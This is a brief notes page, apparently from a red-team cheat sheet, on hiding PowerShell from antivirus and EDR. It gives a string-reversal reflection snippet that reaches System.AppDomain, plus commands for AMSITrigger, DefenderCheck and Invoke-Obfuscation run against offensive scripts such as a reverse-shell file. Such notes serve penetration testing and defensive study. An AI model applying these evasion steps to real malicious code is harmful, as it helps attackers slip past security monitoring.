# Bypassing PowerShell Detection

There are a number of ways that we can obfuscate our PowerShell code to bypass AV, EDR, and Defender.  But,
some of the tools listed below can help us to identify those problems.  We can also do things such as reversing
strings, encoding, and other methods

For example: 
```
$String = 'niamoDppA.metsyS' 
$classrev = ([regex]::MAtches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
```

## AMSI-Trigger
```
AMSITrigger_x64.exe -i Invoke-PowerShellTCP-Detected.ps1
```

## Defender Check
```
DefenderCheck.exe PowerUp.ps1
```

## Invoke-Obfuscation
```
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

# Appendix

- [AMSITrigger GitHub](https://github.com/RythmStick/AMSITrigger)
- [DefenderCheck Github](https://github.com/t3hbb/DefenderCheck)
- [Invoke-Obfuscation GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)
